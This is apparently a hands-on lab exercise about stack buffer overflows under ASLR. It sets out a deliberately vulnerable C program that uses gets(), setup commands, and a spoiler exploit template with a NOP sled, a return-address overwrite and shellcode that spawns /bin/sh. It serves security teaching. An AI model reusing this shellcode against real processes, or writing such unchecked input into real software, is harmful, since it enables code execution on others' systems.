# Exercise 5: The Stack and Buffer overflows 
Welcome to the 5th exercise of today. Here, we will learn more about ASLR, and attempt to do a "simple" buffer overflow much like in the earlier exercise.

<b>Useful links:</b>
* [What is ASLR](https://www.howtogeek.com/278056/what-is-aslr-and-how-does-it-keep-your-computer-secure/)
* [GDB/GEF Doc(https://gef.readthedocs.io/en/master/)


## Setup 

Firstly you have to turn make sure that you have ASLR turned on.
```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
You should now be able to run the binary by
```
./victim
```
And you should receive the output of:
```
0xffd62530
What's your name?
```
## The code
```c
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}

```
As you can see instead of the vulnerable file taking a fileargument it reads from stdin.
## Exercise 5a
Try to run the program again. Does the output change?

## Exercise 5b
Find the size of buffer. 
Does the size of the buffer change between executions?<br>

*You might need to use "aslr on" if you use gdb*
<details>
<summary>Hint</summary>
<i>Hint: Maybe you could use the outputted address for something? Or look at the disassembly?</i>
</details>

## Exercise 5c
Now that you have calculated the size of buffer, you need to run your exploit.

Since we are reading from stdin we are going to use pipes for this.<br>
Firstly create your pipe
```
    > mkfifo pipe
```
In order to run the program you can do such in <b>two</b> terminals<br>
Firstly run the vulnerable file
```
    > ./victim < <(cat pipe)
```
Then provide the input
```
    > echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAA' > pipe
```
Alternatively you can use the exploit.py once it is filled in.
```
    > python exploit.py 0xffb98d40 > pipe
```
You can now create your input using python or any other language of your choice. If you find this too difficult you can open the spoiler below for a template.
<details>
<summary>SPOILER: Template for exploit </summary>

Let us now examine the exploit.py file
```py
    import struct, sys
    pad = "\x90" * (BUFF_SIZE - 4)
    EIP = struct.pack("I", int(sys.argv[1], base=16) + BUFF_SIZE)
    
    #You can use other shellcodes here!
    shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    
    #NoOp Sled
    NOP = "\x90" * 100
    print pad + EIP + NOP + shellcode

```
Now alter this file with the your buffer size and do the exploit. <br>
<b>(NOTE: This file takes an address as an argument. Hmm I wonder which?)</b>
</details>

